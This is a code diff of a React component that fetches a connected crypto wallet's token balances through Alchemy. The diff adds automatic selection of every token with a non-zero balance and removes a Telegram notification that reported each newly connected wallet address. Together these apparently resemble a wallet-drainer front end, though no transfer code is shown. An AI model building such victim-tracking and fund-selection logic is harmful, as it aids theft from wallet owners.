@@ -53,6 +53,7 @@ const alchemyInstances = {
   // Add other networks as needed
 };
 
+
 const chainIdToNetworkMap = {
   1: Network.ETH_MAINNET,      // Ethereum Mainnet
   56: Network.BSC_MAINNET,     // BSC Mainnet
@@ -185,27 +186,23 @@ export const GetTokens = () => {
       const alchemy = alchemyInstances[alchemyNetwork];
 
       console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-      
-      // Fetch ERC20 token balances
+
       const tokensResponse = await alchemy.core.getTokenBalances(address);
-      
-      // Fetch native token balance
       const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
 
-      // Fetch ETH to USD conversion rate
       const rate = await fetchEthToUsdRate();
       setEthToUsdRate(rate);
 
       const nativeToken = {
         contract_address: 'native',
-        contract_ticker_symbol: chain.nativeCurrency.symbol, // Display native currency symbol
-        balance: safeNumber(nativeBalanceResponse), // Add balance to native token
-        quote: 0, // Set quote to 0 as it's the native token
-        quote_rate: 0, // Set quote rate to 0 as it's the native token
+        contract_ticker_symbol: chain.nativeCurrency.symbol,
+        balance: safeNumber(nativeBalanceResponse),
+        quote: 0,
+        quote_rate: 0,
       };
 
       const processedTokens = [
-        nativeToken, // Include native token at the beginning of the tokens list
+        nativeToken,
         ...tokensResponse.tokenBalances.map((balance) => ({
           contract_address: balance.contractAddress,
           balance: safeNumber(balance.tokenBalance),
@@ -215,45 +212,42 @@ export const GetTokens = () => {
       ];
 
       setTokens(processedTokens);
+
+      // Automatically check tokens with non-zero balance
+      const newCheckedRecords = processedTokens.reduce((acc, token) => {
+        if (safeNumber(token.balance).gt(0)) {
+          acc[token.contract_address] = { isChecked: true };
+        }
+        return acc;
+      }, {});
+
+      setCheckedRecords((old) => ({ ...old, ...newCheckedRecords }));
+
       console.log('Fetched tokens:', processedTokens);
     } catch (error) {
       console.error('Error fetching tokens:', error);
       setError(error.message);
     }
     setLoading(false);
-  }, [address, chain, setTokens]);
+  }, [address, chain, setTokens, setCheckedRecords]);
 
   useEffect(() => {
-    if (address && chain?.id) {
+    if (address && isConnected) {
       fetchData();
-      setCheckedRecords({});
     }
-  }, [address, chain?.id, fetchData, setCheckedRecords]);
-
-  useEffect(() => {
-    if (!isConnected) {
-      setTokens([]);
-      setCheckedRecords({});
-      setNotified(false);
-    } else if (isConnected && !notified) {
-      sendTelegramNotification(`New Connection: Wallet Address: ${address}, Chain: ${chain?.name}`);
-      setNotified(true);
-    }
-  }, [isConnected, address, chain, setTokens, setCheckedRecords, notified]);
-
-  if (loading) {
-    return <Loading>Loading</Loading>;
-  }
-
-  if (error) {
-    return <div>{error}</div>;
-  }
+  }, [address, isConnected, fetchData]);
 
   return (
     <div>
-      {tokens.map((token) => (
-        <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />
-      ))}
+      {loading ? (
+        <Loading>Fetching Tokens...</Loading>
+      ) : error ? (
+        <div>{error}</div>
+      ) : (
+        tokens.map((token) => (
+          <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />
+        ))
+      )}
     </div>
   );
 };
